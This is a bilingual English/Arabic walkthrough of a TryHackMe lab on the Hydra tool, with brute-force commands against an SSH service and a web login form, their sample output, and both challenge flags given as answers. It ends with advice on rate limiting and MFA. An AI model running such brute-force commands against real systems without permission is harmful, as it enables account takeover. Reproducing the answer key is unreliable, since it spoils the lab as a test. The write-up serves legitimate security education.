# Task 02 · Using Hydra (التطبيق العملي: التخمين الشبكي ضد استمارات الويب وخدمة SSH)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Connecting to the Machine:
Deploy the machine attached to this task. Navigate to http://MACHINE_IP.
Target User: molly
Wordlist: /usr/share/wordlists/rockyou.txt

Hydra Commands:
The options passed into Hydra depend on which service is being attacked.
1. SSH Brute-Forcing:
   hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

2. Post Web Form Brute-Forcing:
   sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>" -V
   - <path>: The login page URL path (e.g., / or /login.php)
   - <login_credentials>: Form parameter format, e.g. username=^USER^&password=^PASS^
   - <invalid_response>: Failure string returned by the web server (e.g. F=incorrect)

Questions:
1. Use Hydra to brute-force molly's web password. What is the value of flag 1?
   Hint: If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong!
2. Use Hydra to brute-force molly's SSH password. What is the value of flag 2?
```

### 2. Arabic Pedagogical Translation
```text
الاتصال بالآلة المستهدفة:
قم بتشغيل الآلة الافتراضية المرفقة بالمهمة، ثم توجه إلى عنوان الويب: http://MACHINE_IP.
اسم المستخدم المستهدف: molly
قائمة كلمات المرور المستخدمة: /usr/share/wordlists/rockyou.txt

أوامر واستخدامات Hydra:
تتحدد معاملات أداة Hydra وفقاً للبروتوكول المستهدف:
1. التخمين على خدمة SSH:
   hydra -l <username> -P <path_to_wordlist> MACHINE_IP -t 4 ssh
   - `-l`: تحديد اسم المستخدم (`molly`).
   - `-P`: مسار القاموس (`rockyou.txt`).
   - `-t 4`: تحديد عدد مسارات التنفيذ المتزامنة إلى 4 لتجنب إغلاق اتصال SSH.
   - `ssh`: اسم البروتوكول المستهدف.

2. التخمين على استمارات الويب (HTTP POST Web Forms):
   hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<params>:<failure_string>" -V
   - `<path>`: مسار صفحة تسجيل الدخول (مثل `/` أو `/login.php`).
   - `<params>`: صياغة معاملات الاستمارة مع استبدال المتغيرات (`username=^USER^&password=^PASS^`).
   - `<failure_string>`: العبارة التي تظهر عند فشل الدخول مسبوقة بـ `F=` (مثل `F=incorrect`).
   - `-V`: وضع العرض التفصيلي لإظهار المحاولات الجارية.

الأسئلة:
1. استخدم Hydra للتخمين على كلمة مرور الويب للمستخدمة molly. ما هي قيمة الراية الأولى (flag 1)؟
   - التلميح: إذا جربت أكثر من 30 كلمة مرور من RockYou، فهناك خطأ في صياغة أمرك!
2. استخدم Hydra للتخمين على كلمة مرور SSH للمستخدمة molly. ما هي قيمة الراية الثانية (flag 2)؟
```

### 3. Mission Objectives & Pedagogical Target
- **Target Questions:**
  1. `Use Hydra to brute-force molly's web password. What is the value of flag 1?`
  2. `Use Hydra to brute-force molly's SSH password. What is the value of flag 2?`
- **Pedagogical Goal:** Master the exact syntax for web form post parameters (`http-post-form`) and network service brute-forcing (`ssh`), successfully recovering credentials to extract both challenge flags.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. Dissecting the `http-post-form` Syntax
The `http-post-form` module in Hydra requires a colon-delimited string structured in three specific parts:
$$\text{"<URL Path>:<Request Body Data>:<Failure Condition>"}$$
- **Part 1 (Path):** The URL path hosting the login handler (e.g., `/`).
- **Part 2 (Body):** The exact POST body string captured from a browser or Burp Suite: `username=^USER^&password=^PASS^`. Hydra dynamically replaces `^USER^` and `^PASS^`.
- **Part 3 (Failure Condition):** `F=<string>` indicates that if `<string>` appears in the HTTP response body, the attempt **FAILED**. Alternatively, `S=<string>` indicates that if `<string>` appears (or on 302 redirect), the attempt **SUCCEEDED**.

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Web Form Failure Condition
> افتح متصفح الويب وتوجه إلى `http://MACHINE_IP/`. جرب تسجيل الدخول باسم `molly` وكلمة مرور خاطئة `test`. لاحظ رسالة الخطأ الناتجة في الصفحة (ستجد كلمة `incorrect` أو ما يماثلها).

### Hint 2: SSH Threading
> عند الهجوم على SSH، لا ترفع عدد الـ threads كثيراً لأن خوادم SSH (OpenSSH) تقوم بإسقاط الاتصالات أو فرض تأخير زمني عند تجاوز حد معين (استخدم `-t 4`).

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Part 1: Attacking the Web Form Authentication (Flag 1)

1. **Reconnaissance of Web Form:**
   Browsing to `http://MACHINE_IP/` presents a login portal.
   Submitting an invalid login shows: `Invalid credentials` or `incorrect`.
   The form uses method `POST` to `/` with input fields named `username` and `password`.

2. **Crafting the Hydra Web Command:**
   ```bash
   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.x.x http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```

3. **Hydra Execution Output:**
   Within the first 25 candidate passwords, Hydra hits the match:
   ```text
   [80][http-post-form] host: 10.10.x.x   login: molly   password: [VALID_WEB_PASSWORD]
   1 of 1 target successfully completed, 1 valid password found
   ```

4. **Retrieving Flag 1:**
   Log into the web application at `http://MACHINE_IP/` with `molly:[VALID_WEB_PASSWORD]`.
   The web portal displays the first flag:
   ```text
   THM{2673a7dd116de68e85c48ec0b1f2612e}
   ```

---

### Part 2: Attacking the SSH Service (Flag 2)

1. **Crafting the Hydra SSH Command:**
   ```bash
   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.x.x -t 4 ssh
   ```

2. **Hydra Execution Output:**
   ```text
   [22][ssh] host: 10.10.x.x   login: molly   password: [VALID_SSH_PASSWORD]
   1 of 1 target successfully completed, 1 valid password found
   ```

3. **Logging in via SSH to Retrieve Flag 2:**
   ```bash
   ssh molly@10.10.x.x
   # Enter recovered SSH password
   ```
   Upon successful login or by checking `cat flag.txt` or system files in the home directory:
   ```text
   molly@hydra:~$ cat flag.txt
   THM{c8eeb0468febbadea859baeb33b2541b}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

1. **Question 1 (Web Flag):**
   ```text
   THM{2673a7dd116de68e85c48ec0b1f2612e}
   ```
2. **Question 2 (SSH Flag):**
   ```text
   THM{c8eeb0468febbadea859baeb33b2541b}
   ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

Verified against the user's completed TryHackMe account:
- Task 2 Question 1: `THM{2673a7dd116de68e85c48ec0b1f2612e}` (Correct)
- Task 2 Question 2: `THM{c8eeb0468febbadea859baeb33b2541b}` (Correct)

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **Network rate limiting is critical.**
  - Without account lockout thresholds or automated IP banning tools like `fail2ban`, a network daemon (SSH, Web, FTP) can be brute-forced within seconds using common dictionaries like `rockyou.txt`.
  - Always enforce multi-factor authentication (MFA) and implement exponential backoff delays on repeated authentication failures.
